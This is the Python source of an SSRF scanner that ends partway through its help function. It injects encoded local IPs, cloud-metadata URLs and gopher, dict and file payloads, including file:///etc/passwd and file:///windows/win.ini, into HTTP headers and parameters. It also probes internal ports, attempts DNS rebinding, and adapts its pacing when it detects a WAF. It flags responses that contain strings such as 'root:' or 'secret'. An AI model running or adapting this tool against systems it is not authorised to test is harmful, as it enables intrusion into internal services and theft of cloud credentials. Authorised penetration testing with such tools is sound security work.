# Copyright 2025 Ruslan Semchenko
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.
import sys
import getopt
import os
import queue
import threading
from threading import Thread, Lock
import requests
from requests.adapters import HTTPAdapter, Retry
from requests.exceptions import RequestException, Timeout, ConnectionError
import urllib3
import json
import csv
from datetime import datetime
from urllib.parse import urlparse, quote, unquote
import logging
import random
import colorama
from colorama import Fore, Style
import base64
import ipaddress
import socket
import yaml
import jinja2
from dataclasses import dataclass
from pathlib import Path
from typing import Dict, List, Optional, Any, Set
import time
from collections import deque

colorama.init(autoreset=True)

__version__ = 'version 0.0.1'


def safe_header_value(value):
    """Фильтрует значения, которые не могут быть закодированы в latin-1 для HTTP заголовков."""
    try:
        value.encode('latin-1')
        return value
    except UnicodeEncodeError:
        return None


class Config:
    def __init__(self):
        self.scanner = {
            'threads': 10,
            'timeout': 3,
            'retry_count': 2,
            'debug': False,
            'verify_ssl': False,
            'follow_redirects': True,
            'max_redirects': 3,
            'output_dir': "output",
            'user_agent': "SSRF-Scanner/1.0",
            'max_pool_size': 100,
            'capture_cookies': True
        }
        self.rate_limiting = {
            'requests_per_second': 10,
            'burst_size': 20,
            'min_rate': 0.5,
            'max_rate': 50
        }

    def get(self, key, default=None):
        return self.scanner.get(key, default)


class ScanProgress:
    def __init__(self):
        self.phases = {
            'Local IP': 0,
            'Cloud Metadata': 0,
            'Protocol': 0,
            'Encoded': 0,
            'Parameter': 0,
            'Port Scan': 0,
            'DNS Rebinding': 0,
            'Remote': 0
        }
        self.current_phase = None
        self.total_phases = len(self.phases)
        self.phase_weight = {
            'Local IP': 0.25,
            'Cloud Metadata': 0.15,
            'Protocol': 0.15,
            'Encoded': 0.10,
            'Parameter': 0.10,
            'Port Scan': 0.10,
            'DNS Rebinding': 0.10,
            'Remote': 0.05
        }

    def update_phase(self, phase, progress):
        self.phases[phase] = progress
        self.current_phase = phase

    def get_total_progress(self):
        total = 0
        for phase, weight in self.phase_weight.items():
            total += self.phases[phase] * weight
        return total * 100


@dataclass
class ScanResult:
    url: str
    attack_type: str
    payload: str
    response_code: int
    response_size: int
    timestamp: datetime
    headers: Dict[str, str]
    is_vulnerable: bool
    verification_method: str = ""
    notes: str = ""


class PayloadGenerator:
    def __init__(self):
        self.ip_formats = ['decimal', 'hex', 'octal']
        self.url_encodings = ['single', 'double', 'base64']
        self.protocol_variations = ['standard', 'nested', 'mixed']

    def generate_ip_variations(self, ip):
        variations = set()
        try:
            variations.add(ip)
            if ip in ['localhost', 'internal', 'intranet']:
                variations.add('127.0.0.1')
                return list(variations)
            if ':' in ip:
                variations.add(ip)
                variations.add(ip.strip('[]'))
                variations.add(f'[{ip}]')
                return list(variations)
            if any(c.isalpha() for c in ip):
                variations.add(ip)
                return list(variations)
            if '.' in ip:
                try:
                    parts = ip.split('.')
                    if len(parts) == 4:
                        variations.add(ip)
                        try:
                            ipint = int.from_bytes(socket.inet_aton(ip), 'big')
                            variations.add(str(ipint))
                        except:
                            pass
                        try:
                            hex_parts = [hex(int(part))[2:] for part in parts]
                            variations.add('.'.join(f"0x{part}" for part in hex_parts))
                        except:
                            pass
                        try:
                            oct_parts = [oct(int(part))[2:] for part in parts]
                            variations.add('.'.join(f"0{part}" for part in oct_parts))
                        except:
                            pass
                        try:
                            variations.add(f"{parts[0]}.{int(parts[1])}.{hex(int(parts[2]))[2:]}.{oct(int(parts[3]))[2:]}")
                        except:
                            pass
                except Exception as e:
                    logging.debug(f"Error processing IPv4 address {ip}: {str(e)}")
            elif ip.startswith('0x'):
                try:
                    dec = int(ip[2:], 16)
                    ip_bytes = dec.to_bytes(4, 'big')
                    variations.add('.'.join(str(b) for b in ip_bytes))
                except:
                    variations.add(ip)
            elif ip.startswith('0'):
                try:
                    dec = int(ip, 8)
                    ip_bytes = dec.to_bytes(4, 'big')
                    variations.add('.'.join(str(b) for b in ip_bytes))
                except:
                    variations.add(ip)
            current_variations = variations.copy()
            for var in current_variations:
                variations.add(quote(var))
                variations.add(quote(quote(var)))
        except Exception as e:
            logging.debug(f"Error generating variations for {ip}: {str(e)}")
            variations.add(ip)
        return list(variations)

    def generate_url_encodings(self, url):
        variations = set()
        try:
            variations.add(url)
            variations.add(quote(url))
            variations.add(quote(quote(url)))
            variations.add(base64.b64encode(url.encode()).decode())
            # Исключаем варианты, которые не кодируются в latin-1
            for var in [url.replace('.', '%2e'), url.replace('/', '%2f'), url.replace('.', '。'), url.replace('/', '／')]:
                if safe_header_value(var):
                    variations.add(var)
        except Exception as e:
            logging.debug(f"Error generating URL encodings for {url}: {str(e)}")
            variations.add(url)
        return list(variations)

    def generate_protocol_variations(self, protocol, payload):
        variations = set()
        try:
            variations.add(f"{protocol}://{payload}")
            variations.add(f"{protocol}:/{payload}")
            variations.add(f"{protocol}:///{payload}")
            variations.add(f"{protocol}://{protocol}://{payload}")
            variations.add(f"{protocol.upper()}://{payload}")
            variations.add(f"{protocol.title()}://{payload}")
            variations.add(f"{quote(protocol)}://{payload}")
        except Exception as e:
            logging.error(f"Error generating protocol variations for {protocol}: {str(e)}")
        return list(variations)


class ProtocolHandler:
    def __init__(self):
        self.generator = PayloadGenerator()

    def handle_gopher(self, payload):
        variations = []
        try:
            variations.append(f"gopher://{payload}")
            variations.append(f"gopher://{payload}:70")
            variations.append(f"gopher://{payload}/1")
            for var in self.generator.generate_url_encodings(f"gopher://{payload}"):
                if safe_header_value(var):
                    variations.append(var)
        except Exception as e:
            logging.error(f"Error handling gopher protocol: {str(e)}")
        return variations

    def handle_dict(self, payload):
        variations = []
        try:
            variations.append(f"dict://{payload}")
            variations.append(f"dict://{payload}/d:password")
            variations.append(f"dict://{payload}/show:db")
            variations.append(f"dict://dict:dict@{payload}")
        except Exception as e:
            logging.error(f"Error handling dict protocol: {str(e)}")
        return variations

    def handle_file(self, payload):
        variations = []
        try:
            variations.append(f"file://{payload}")
            variations.append(f"file:///{payload}")
            variations.append(f"file:///etc/passwd")
            variations.append(f"file:///windows/win.ini")
            variations.append(f"file://../{payload}")
            variations.append(f"file:///./{payload}")
        except Exception as e:
            logging.error(f"Error handling file protocol: {str(e)}")
        return variations

    def generate_protocol_variations(self, protocol, payload):
        return PayloadGenerator().generate_protocol_variations(protocol, payload)


class Reporter:
    def __init__(self, output_dir: str):
        self.output_dir = Path(output_dir)
        self.output_dir.mkdir(parents=True, exist_ok=True)
        self.results: List[ScanResult] = []
        self.txt_output = self.output_dir / 'report.txt'
        self.json_output = self.output_dir / 'report.json'
        self.csv_output = self.output_dir / 'report.csv'

    def add_result(self, result: ScanResult):
        self.results.append(result)
        self._write_result(result)

    def _write_result(self, result: ScanResult):
        with open(self.txt_output, 'a') as f:
            f.write(f"\nPotential SSRF Found!\n")
            f.write(f"URL: {result.url}\n")
            f.write(f"Attack Type: {result.attack_type}\n")
            f.write(f"Payload: {result.payload}\n")
            f.write(f"Response Code: {result.response_code}\n")
            f.write(f"Response Size: {result.response_size}\n")
            f.write(f"Verification Method: {result.verification_method}\n")
            f.write(f"Notes: {result.notes}\n")
            f.write("-" * 50 + "\n")
        with open(self.csv_output, 'a', newline='') as f:
            writer = csv.writer(f)
            if f.tell() == 0:
                writer.writerow([
                    'URL', 'Attack Type', 'Payload', 'Response Code',
                    'Response Size', 'Verification Method', 'Timestamp', 'Notes'
                ])
            writer.writerow([
                result.url, result.attack_type, result.payload,
                result.response_code, result.response_size,
                result.verification_method, result.timestamp, result.notes
            ])
        results_json = []
        if self.json_output.exists():
            with open(self.json_output, 'r') as f:
                try:
                    results_json = json.load(f)
                except json.JSONDecodeError:
                    results_json = []
        results_json.append({
            'url': result.url,
            'attack_type': result.attack_type,
            'payload': result.payload,
            'response_code': result.response_code,
            'response_size': result.response_size,
            'verification_method': result.verification_method,
            'timestamp': result.timestamp.isoformat(),
            'notes': result.notes
        })
        with open(self.json_output, 'w') as f:
            json.dump(results_json, f, indent=2)

    def generate_summary(self) -> str:
        stats = self._calculate_statistics()
        summary = "\n" + "="*50 + "\n"
        summary += "SSRF Scan Summary\n"
        summary += "="*50 + "\n\n"
        summary += "Statistics:\n"
        summary += "-"*20 + "\n"
        for key, value in stats.items():
            summary += f"{key}: {value}\n"
        summary += "\nVulnerabilities by Attack Type:\n"
        summary += "-"*30 + "\n"
        grouped = self._group_vulnerabilities()
        for attack_type, results in grouped.items():
            summary += f"{attack_type}: {len(results)} found\n"
        summary += "\n" + "="*50 + "\n"
        summary += f"Detailed results saved in:\n"
        summary += f"Text Report: {self.txt_output}\n"
        summary += f"CSV Report: {self.csv_output}\n"
        summary += f"JSON Report: {self.json_output}\n"
        with open(self.output_dir / 'summary.txt', 'w') as f:
            f.write(summary)
        return summary

    def _calculate_statistics(self) -> Dict[str, Any]:
        total_urls = len(set(r.url for r in self.results))
        total_vulnerabilities = len([r for r in self.results if r.is_vulnerable])
        return {
            'Total URLs Scanned': total_urls,
            'Total Requests': len(self.results),
            'Vulnerabilities Found': total_vulnerabilities,
            'Success Rate': f"{(total_vulnerabilities / len(self.results)) * 100:.1f}%" if self.results else "0%",
            'Unique Attack Types': len(set(r.attack_type for r in self.results))
        }

    def _group_vulnerabilities(self) -> Dict[str, List[ScanResult]]:
        grouped = {}
        for result in self.results:
            if result.is_vulnerable:
                if result.attack_type not in grouped:
                    grouped[result.attack_type] = []
                grouped[result.attack_type].append(result)
        return grouped


class RateLimiter:
    def __init__(self, requests_per_second: float, burst_size: int = 10):
        self.rate = requests_per_second
        self.burst_size = burst_size
        self.tokens = burst_size
        self.last_update = time.time()
        self.lock = threading.Lock()
        self.request_history = deque(maxlen=1000)
        self.error_count = 0
        self.success_count = 0
        self.adaptive_rate = requests_per_second
        self.min_rate = 0.5
        self.max_rate = requests_per_second * 2

    def wait(self) -> bool:
        with self.lock:
            now = time.time()
            time_passed = now - self.last_update
            self.tokens = min(
                self.burst_size,
                self.tokens + time_passed * self.rate
            )
            if self.tokens >= 1:
                self.tokens -= 1
                self.last_update = now
                self.request_history.append(now)
                return True
            wait_time = (1 - self.tokens) / self.rate
            time.sleep(wait_time)
            self.tokens -= 1
            self.last_update = time.time()
            self.request_history.append(self.last_update)
            return True

    def adjust_rate(self, success: bool):
        with self.lock:
            if success:
                self.success_count += 1
                self.error_count = max(0, self.error_count - 1)
                if self.success_count > 10:
                    self.adaptive_rate = min(
                        self.max_rate,
                        self.adaptive_rate * 1.1
                    )
                    self.success_count = 0
            else:
                self.error_count += 1
                self.success_count = 0
                if self.error_count > 3:
                    self.adaptive_rate = max(
                        self.min_rate,
                        self.adaptive_rate * 0.5
                    )
                    self.error_count = 0
            self.rate = self.adaptive_rate


class SmartThrottler:
    def __init__(self):
        self.rate_limiter = RateLimiter(requests_per_second=10)
        self.backoff_time = 1.0
        self.max_backoff = 30.0
        self.success_threshold = 5
        self.consecutive_successes = 0
        self.consecutive_failures = 0
        self.lock = threading.Lock()

    def pre_request(self):
        self.rate_limiter.wait()

    def post_request(self, success: bool):
        with self.lock:
            if success:
                self.consecutive_successes += 1
                self.consecutive_failures = 0
                self._decrease_backoff()
            else:
                self.consecutive_failures += 1
                self.consecutive_successes = 0
                self._increase_backoff()
            self.rate_limiter.adjust_rate(success)

    def _increase_backoff(self):
        self.backoff_time = min(
            self.max_backoff,
            self.backoff_time * 2
        )
        time.sleep(self.backoff_time)

    def _decrease_backoff(self):
        if self.consecutive_successes >= self.success_threshold:
            self.backoff_time = max(
                1.0,
                self.backoff_time * 0.5
            )


class ErrorHandler:
    def __init__(self):
        self.throttler = SmartThrottler()
        self.max_retries = 3
        self.timeout_multiplier = 1.5
        self.current_timeout = 10
        self.error_counts: Dict[str, int] = {}
        self.waf_signatures = [
            'blocked',
            'forbidden',
            'waf',
            'security',
            'cloudflare',
            'protection'
        ]

    def handle_error(self, url: str, error: Exception, response: Optional[requests.Response] = None) -> bool:
        error_type = type(error).__name__
        self.error_counts[error_type] = self.error_counts.get(error_type, 0) + 1
        if isinstance(error, Timeout):
            return self.handle_timeout()
        elif isinstance(error, ConnectionError):
            return self.handle_connection_error()
        elif isinstance(error, RequestException):
            if response and self._detect_waf(response):
                return self.handle_waf(url)
            return self.handle_general_error(error)
        return False

    def handle_timeout(self) -> bool:
        self.current_timeout *= self.timeout_multiplier
        self.throttler.post_request(success=False)
        return True

    def handle_connection_error(self) -> bool:
        time.sleep(random.uniform(1, 3))
        self.throttler.post_request(success=False)
        return True

    def handle_waf(self, url: str) -> bool:
        logging.warning(f"WAF detected for {url}. Adjusting strategy...")
        self.throttler.backoff_time *= 2
        time.sleep(random.uniform(5, 10))
        return True

    def handle_general_error(self, error) -> bool:
        should_retry = self.error_counts.get(type(error).__name__, 0) < self.max_retries
        if should_retry:
            time.sleep(random.uniform(0.5, 1.5))
        return should_retry

    def _detect_waf(self, response: requests.Response) -> bool:
        if response.status_code in [403, 406, 429, 456]:
            return True
        response_text = response.text.lower()
        response_headers = str(response.headers).lower()
        for signature in self.waf_signatures:
            if signature in response_text or signature in response_headers:
                return True
        return False

    def reset_error_counts(self):
        self.error_counts.clear()
        self.current_timeout = 10


class RequestManager:
    def __init__(self):
        self.error_handler = ErrorHandler()
        self.throttler = SmartThrottler()
        self.session = self._create_session()

    def _create_session(self) -> requests.Session:
        session = requests.Session()
        retry_strategy = Retry(
            total=3,
            backoff_factor=0.5,
            status_forcelist=[500, 502, 503, 504]
        )
        adapter = HTTPAdapter(max_retries=retry_strategy)
        session.mount("http://", adapter)
        session.mount("https://", adapter)
        return session

    def make_request(self, url: str, method: str = 'GET', **kwargs) -> Optional[requests.Response]:
        retries = 0
        max_retries = 3
        while retries < max_retries:
            try:
                self.throttler.pre_request()
                response = self.session.request(
                    method=method,
                    url=url,
                    timeout=self.error_handler.current_timeout,
                    **kwargs
                )
                self.throttler.post_request(success=True)
                self.error_handler.reset_error_counts()
                return response
            except Exception as e:
                retries += 1
                should_retry = self.error_handler.handle_error(url, e, response if 'response' in locals() else None)
                if not should_retry or retries >= max_retries:
                    logging.error(f"Max retries reached for {url}: {str(e)}")
                    return None
        return None


class SSRFScanner:
    def __init__(self):
        printBanner()
        self.config = Config()
        self.session = self._create_session()
        self.request_manager = RequestManager()
        self.error_handler = ErrorHandler()
        self.throttler = SmartThrottler()
        self.payload_generator = PayloadGenerator()
        self.protocol_handler = ProtocolHandler()
        self.q = queue.Queue()
        self.lock = Lock()
        self.setup_logging()
        self.local_ips = []
        self.headers = []
        self.cloud_metadata = []
        self.protocols = []
        self.encoded_payloads = []
        self.parameter_payloads = []
        self.port_payloads = []
        self.dns_rebinding = []
        self.nrTotUrls = 0
        self.nrUrlsAnalyzed = 0
        self.nrErrorUrl = 0
        self.backurl = ""
        self.cookies = None
        self.progress = ScanProgress()
        self.output_filename = datetime.now().strftime("%Y_%m_%d-%I_%M_%S_%p")
        self.setup_output_files()
        self.load_all_payloads()
        self.reporter = Reporter(self.config.scanner['output_dir'])

    def _create_session(self):
        session = requests.Session()
        retry_strategy = Retry(
            total=self.config.scanner['retry_count'],
            backoff_factor=0.5,
            status_forcelist=[500, 502, 503, 504]
        )
        adapter = HTTPAdapter(
            max_retries=retry_strategy,
            pool_connections=self.config.scanner['max_pool_size'],
            pool_maxsize=self.config.scanner['max_pool_size']
        )
        session.mount("http://", adapter)
        session.mount("https://", adapter)
        return session

    def setup_logging(self):
        logging.basicConfig(
            level=logging.INFO if not self.config.scanner['debug'] else logging.DEBUG,
            format='%(asctime)s - %(levelname)s - %(message)s'
        )
        self.logger = logging.getLogger('ssrf_scanner')
        urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

    def setup_output_files(self):
        self.output_dir = f"output/{self.output_filename}"
        os.makedirs(self.output_dir, exist_ok=True)
        self.txt_output = f"{self.output_dir}/scan.txt"
        self.csv_output = f"{self.output_dir}/scan.csv"
        self.json_output = f"{self.output_dir}/scan.json"

    def load_all_payloads(self):
        payload_dir = "payloads"
        if not os.path.exists(payload_dir):
            os.makedirs(payload_dir)
            self.logger.warning(f"Created {payload_dir} directory")
        payload_files = {
            'local_ips.txt': self.local_ips,
            'headers.txt': self.headers,
            'cloud_metadata.txt': self.cloud_metadata,
            'protocols.txt': self.protocols,
            'encoded_payloads.txt': self.encoded_payloads,
            'parameter_payloads.txt': self.parameter_payloads,
            'port_payloads.txt': self.port_payloads,
            'dns_rebinding.txt': self.dns_rebinding
        }
        for filename, payload_list in payload_files.items():
            filepath = os.path.join(payload_dir, filename)
            try:
                if not os.path.exists(filepath):
                    with open(filepath, 'w') as f:
                        f.write("# Add your payloads here\n")
                    self.logger.warning(f"Created empty payload file: {filename}")
                else:
                    with open(filepath, 'r') as f:
                        payload_list.extend([line.strip() for line in f if line.strip() and not line.startswith('#')])
                        self.logger.info(f"Loaded {len(payload_list)} payloads from {filename}")
            except Exception as e:
                self.logger.error(f"Error processing {filename}: {str(e)}")

    def make_request(self, url, method='GET', headers=None, timeout=None):
        try:
            self.throttler.pre_request()
            default_headers = {
                'User-Agent': self.config.scanner['user_agent'],
                'Accept': '*/*'
            }
            if headers:
                for k, v in headers.items():
                    safe_v = safe_header_value(v)
                    if safe_v is not None:
                        default_headers[k] = safe_v
                    else:
                        if self.config.scanner['debug']:
                            self.logger.debug(f"Skipped header {k}: {v} (non-latin-1)")
            if self.cookies:
                if isinstance(self.cookies, str):
                    default_headers['Cookie'] = self.cookies
                elif isinstance(self.cookies, dict):
                    default_headers['Cookie'] = '; '.join([f'{k}={v}' for k, v in self.cookies.items()])
            response = self.session.request(
                method=method,
                url=url,
                headers=default_headers,
                timeout=timeout or self.config.scanner['timeout'],
                verify=self.config.scanner['verify_ssl'],
                allow_redirects=self.config.scanner['follow_redirects']
            )
            if self.config.scanner['capture_cookies'] and 'Set-Cookie' in response.headers and not self.cookies:
                self.cookies = response.headers['Set-Cookie']
                if self.config.scanner['debug']:
                    self.logger.info(f"Captured cookies from response: {self.cookies}")
            self.throttler.post_request(success=True)
            return response
        except Exception as e:
            self.throttler.post_request(success=False)
            if self.config.scanner['debug']:
                self.logger.error(f"Request failed for {url}: {str(e)}")
            return None

    def analyze_response(self, original_response, test_response):
        if not test_response:
            return False, {}
        differences = {
            'status_code': original_response.status_code != test_response.status_code,
            'content_length': len(original_response.content) != len(test_response.content),
            'content_type': original_response.headers.get('content-type') != test_response.headers.get('content-type'),
            'word_count': len(original_response.text.split()) != len(test_response.text.split()),
            'response_time': abs(test_response.elapsed.total_seconds() - original_response.elapsed.total_seconds()) > 2
        }
        return any(differences.values()), differences

    def print_progress(self):
        with self.lock:
            total_progress = self.progress.get_total_progress()
            current_phase = self.progress.current_phase or "Initializing"
            print('\r' + ' ' * 100 + '\r', end='')
            print(f"URLs: {self.nrUrlsAnalyzed}/{self.nrTotUrls} | "
                  f"Errors: {self.nrErrorUrl} | "
                  f"Phase: {current_phase} | "
                  f"Overall Progress: {total_progress:.1f}%", end='\r')

    def update_progress(self, phase, completed, total):
        progress = (completed / total * 100) if total > 0 else 100
        self.progress.update_phase(phase, progress/100)
        self.print_progress()

    def perform_attack(self, url: str, attack_type: str, payload: str, headers: Dict[str, str]) -> Optional[ScanResult]:
        try:
            original_response = self.make_request(url)
            if not original_response:
                return None
            response = self.make_request(url, headers=headers)
            if not response:
                return None
            is_vulnerable, differences = self.analyze_response(original_response, response)
            result = ScanResult(
                url=url,
                attack_type=attack_type,
                payload=payload,
                response_code=response.status_code,
                response_size=len(response.content),
                timestamp=datetime.now(),
                headers=headers,
                is_vulnerable=is_vulnerable,
                notes=str(differences) if differences else ""
            )
            if is_vulnerable:
                result.verification_method = self.verify_vulnerability(url, payload, response)
                self.reporter.add_result(result)
            return result
        except Exception as e:
            self.logger.error(f"Error performing {attack_type} attack on {url}: {str(e)}")
            return None

    def localAttack(self, url, original_response):
        base_ips = self.local_ips.copy()
        for ip in base_ips:
            variations = self.payload_generator.generate_ip_variations(ip)
            self.local_ips.extend(variations)
        total_tests = len(self.headers) * len(self.local_ips)
        completed_tests = 0
        for header in self.headers:
            for ip in self.local_ips:
                completed_tests += 1
                self.update_progress('Local IP', completed_tests, total_tests)
                for payload in self.payload_generator.generate_url_encodings(ip):
                    header_value = safe_header_value(payload)
                    if header_value is None:
                        continue
                    badHeader = {header: header_value}
                    result = self.perform_attack(url, 'LocalIP', payload, badHeader)
                    if result and result.is_vulnerable:
                        self.log_vulnerability(result)

    def cloudMetadataAttack(self, url, original_response):
        total_tests = len(self.headers) * len(self.cloud_metadata)
        completed_tests = 0
        for header in self.headers:
            for metadata_url in self.cloud_metadata:
                completed_tests += 1
                self.update_progress('Cloud Metadata', completed_tests, total_tests)
                variations = self.payload_generator.generate_url_encodings(metadata_url)
                for payload in variations:
                    header_value = safe_header_value(payload)
                    if header_value is None:
                        continue
                    badHeader = {header: header_value}
                    result = self.perform_attack(url, 'CloudMetadata', payload, badHeader)
                    if result and result.is_vulnerable:
                        self.log_vulnerability(result)

    def protocolAttack(self, url, original_response):
        total_tests = len(self.headers) * len(self.protocols) * min(len(self.local_ips), 5)
        completed_tests = 0
        for header in self.headers:
            for protocol in self.protocols:
                for ip in self.local_ips[:5]:
                    completed_tests += 1
                    self.update_progress('Protocol', completed_tests, total_tests)
                    if protocol == 'gopher':
                        payloads = self.protocol_handler.handle_gopher(ip)
                    elif protocol == 'dict':
                        payloads = self.protocol_handler.handle_dict(ip)
                    elif protocol == 'file':
                        payloads = self.protocol_handler.handle_file(ip)
                    else:
                        payloads = self.protocol_handler.generate_protocol_variations(protocol, ip)
                    for payload in payloads:
                        header_value = safe_header_value(payload)
                        if header_value is None:
                            continue
                        badHeader = {header: header_value}
                        result = self.perform_attack(url, 'Protocol', payload, badHeader)
                        if result and result.is_vulnerable:
                            self.log_vulnerability(result)

    def encodedAttack(self, url, original_response):
        total_tests = len(self.headers) * len(self.encoded_payloads)
        completed_tests = 0
        for header in self.headers:
            for base_payload in self.encoded_payloads:
                completed_tests += 1
                self.update_progress('Encoded', completed_tests, total_tests)
                encoded_variations = [
                    base_payload,
                    quote(base_payload),
                    quote(quote(base_payload)),
                    base64.b64encode(base_payload.encode()).decode(),
                ]
                for payload in encoded_variations:
                    header_value = safe_header_value(payload)
                    if header_value is None:
                        continue
                    badHeader = {header: header_value}
                    result = self.perform_attack(url, 'Encoded', payload, badHeader)
                    if result and result.is_vulnerable:
                        self.log_vulnerability(result)

    def parameterAttack(self, url, original_response):
        total_tests = len(self.parameter_payloads)
        completed_tests = 0
        for param in self.parameter_payloads:
            completed_tests += 1
            self.update_progress('Parameter', completed_tests, total_tests)
            if '?' in url:
                test_url = f"{url}&{param}"
            else:
                test_url = f"{url}?{param}"
            response = self.make_request(test_url)
            logInfo = {
                'Hostname': url,
                'HeaderField': 'Parameter',
                'HeaderValue': param,
                'AttackType': 'Parameter',
                'ResponseCode': 'Error',
                'ResponseSize': 'Error',
                'OriginalCode': str(original_response.status_code),
                'OriginalSize': str(len(original_response.content))
            }
            if response:
                self.checkIfLogResult(original_response, response, {}, logInfo)

    def portScanAttack(self, url, original_response):
        total_tests = len(self.headers) * len(self.port_payloads) * min(len(self.local_ips), 5)
        completed_tests = 0
        for header in self.headers:
            for port in self.port_payloads:
                for ip in self.local_ips[:5]:
                    completed_tests += 1
                    self.update_progress('Port Scan', completed_tests, total_tests)
                    payload = f"{ip}{port}"
                    header_value = safe_header_value(payload)
                    if header_value is None:
                        continue
                    badHeader = {header: header_value}
                    result = self.perform_attack(url, 'PortScan', payload, badHeader)
                    if result and result.is_vulnerable:
                        self.log_vulnerability(result)

    def dnsRebindingAttack(self, url, original_response):
        total_tests = len(self.headers) * len(self.dns_rebinding)
        completed_tests = 0
        for header in self.headers:
            for dns in self.dns_rebinding:
                completed_tests += 1
                self.update_progress('DNS Rebinding', completed_tests, total_tests)
                if '<BURP-COLLABORATOR>' in dns and self.backurl:
                    dns = dns.replace('<BURP-COLLABORATOR>', self.backurl)
                header_value = safe_header_value(dns)
                if header_value is None:
                    continue
                badHeader = {header: header_value}
                result = self.perform_attack(url, 'DNSRebinding', dns, badHeader)
                if result and result.is_vulnerable:
                    self.log_vulnerability(result)

    def verify_vulnerability(self, url: str, payload: str, response) -> str:
        verification_methods = [
            self._verify_response_code,
            self._verify_response_content,
            self._verify_response_headers,
            self._verify_timing_difference
        ]
        for method in verification_methods:
            if method(response):
                return method.__name__
        return "unverified"

    def _verify_response_code(self, response) -> bool:
        return response.status_code in [200, 301, 302, 307]

    def _verify_response_content(self, response) -> bool:
        indicators = [
            'root:',
            'admin:',
            'internal',
            'password',
            'key',
            'uid=',
            'metadata',
            'aws',
            'secret'
        ]
        return any(indicator in response.text.lower() for indicator in indicators)

    def _verify_response_headers(self, response) -> bool:
        suspicious_headers = [
            'x-internal',
            'server-internal',
            'x-backend-server',
            'x-upstream',
            'x-host',
            'x-forwarded-server'
        ]
        return any(header.lower() in response.headers for header in suspicious_headers)

    def _verify_timing_difference(self, response) -> bool:
        return response.elapsed.total_seconds() > 2.0

    def log_vulnerability(self, result: ScanResult):
        with self.lock:
            self.logger.warning(f"\nPotential SSRF vulnerability found!")
            self.logger.warning(f"URL: {result.url}")
            self.logger.warning(f"Attack Type: {result.attack_type}")
            self.logger.warning(f"Payload: {result.payload}")
            self.logger.warning(f"Response Code: {result.response_code}")
            self.logger.warning(f"Verification Method: {result.verification_method}")
            self.logger.warning("-" * 50)

    def checkIfLogResult(self, original_response, response, tempResponses, logInfo):
        is_different, differences = self.analyze_response(original_response, response)
        if is_different:
            response_code = str(response.status_code)
            response_size = str(len(response.content))
            if response_code not in tempResponses:
                tempResponses[response_code] = [response_size]
                logInfo['ResponseCode'] = response_code
                logInfo['ResponseSize'] = response_size
                self.log_result(logInfo)
            elif response_size not in tempResponses[response_code]:
                tempResponses[response_code].append(response_size)
                logInfo['ResponseCode'] = response_code
                logInfo['ResponseSize'] = response_size
                self.log_result(logInfo)

    def log_result(self, info):
        with self.lock:
            with open(self.csv_output, 'a', newline='') as f:
                writer = csv.DictWriter(f, fieldnames=info.keys())
                if f.tell() == 0:
                    writer.writeheader()
                writer.writerow(info)
            results = []
            if os.path.exists(self.json_output):
                with open(self.json_output, 'r') as f:
                    try:
                        results = json.load(f)
                    except json.JSONDecodeError:
                        results = []
            results.append(info)
            with open(self.json_output, 'w') as f:
                json.dump(results, f, indent=2)
            with open(self.txt_output, 'a') as f:
                f.write(f"\nPotential SSRF Found!\n")
                f.write(f"URL: {info['Hostname']}\n")
                f.write(f"Attack Type: {info['AttackType']}\n")
                f.write(f"Header: {info['HeaderField']}\n")
                f.write(f"Payload: {info['HeaderValue']}\n")
                f.write(f"Response Code: {info['ResponseCode']}\n")
                f.write(f"Response Size: {info['ResponseSize']}\n")
                f.write("-" * 50 + "\n")

    def performAllAttack(self, url):
        original_response = self.make_request(url)
        if original_response:
            self.progress.current_phase = "Local IP"
            self.localAttack(url, original_response)
            self.progress.current_phase = "Cloud Metadata"
            self.cloudMetadataAttack(url, original_response)
            self.progress.current_phase = "Protocol"
            self.protocolAttack(url, original_response)
            self.progress.current_phase = "Encoded"
            self.encodedAttack(url, original_response)
            self.progress.current_phase = "Parameter"
            self.parameterAttack(url, original_response)
            self.progress.current_phase = "Port Scan"
            self.portScanAttack(url, original_response)
            self.progress.current_phase = "DNS Rebinding"
            self.dnsRebindingAttack(url, original_response)
        else:
            with self.lock:
                self.nrErrorUrl += 1
                if self.config.scanner['debug']:
                    print(Fore.RED + f"Connection error with url: {url}")

    def scan_urls(self):
        while True:
            try:
                url = self.q.get_nowait()
            except queue.Empty:
                break
            self.nrUrlsAnalyzed += 1
            self.print_progress()
            self.performAllAttack(url)
            self.q.task_done()

    def print_final_summary(self):
        print("\n" + "="*50)
        print("Scan Complete!")
        print("="*50)
        print(f"Total URLs processed: {self.nrTotUrls}")
        print(f"Successfully analyzed: {self.nrUrlsAnalyzed}")
        print(f"Errors encountered: {self.nrErrorUrl}")
        print("\nPhase Completion:")
        for phase, progress in self.progress.phases.items():
            print(f"  {phase}: {progress*100:.1f}%")
        print(f"\nOverall Progress: {self.progress.get_total_progress():.1f}%")
        print("="*50)
        print(f"Results saved in: {self.output_dir}")

    def run(self, urls=None, url_file=None):
        try:
            if urls:
                for url in urls:
                    self.q.put(url)
                    self.nrTotUrls += 1
            elif url_file:
                with open(url_file) as f:
                    for line in f:
                        url = line.strip()
                        if url:
                            self.q.put(url)
                            self.nrTotUrls += 1
            threads = []
            for _ in range(self.config.scanner['threads']):
                t = Thread(target=self.scan_urls)
                t.daemon = True
                t.start()
                threads.append(t)
            self.q.join()
            summary = self.reporter.generate_summary()
            print(summary)
        except KeyboardInterrupt:
            print(Fore.RED + "\n[!] Scan interrupted by user (Ctrl+C)")
            self.print_final_summary()
            sys.exit(1)


def printBanner():
    print("""
            ░██████╗░██████╗██████╗░███████╗
            ██╔════╝██╔════╝██╔══██╗██╔════╝
            ╚█████╗░╚█████╗░██████╔╝█████╗░░
            ░╚═══██╗░╚═══██╗██╔══██╗██╔══╝░░
            ██████╔╝██████╔╝██║░░██║██║░░░░░
            ╚═════╝░╚═════╝░╚═╝░░╚═╝╚═╝
    """)
    print(__version__ + " by RuslanSemchenko")
    print(Fore.YELLOW + "[WRN] Use with caution. You are responsible for your actions")
    print(Fore.YELLOW + "[WRN] Developers assume no liability and are not responsible for any misuse or damage.")

def print_help():
    print(Fore.GREEN + "SSRF Scanner Help Menu")
    print(Fore.GREEN + "Usage:")
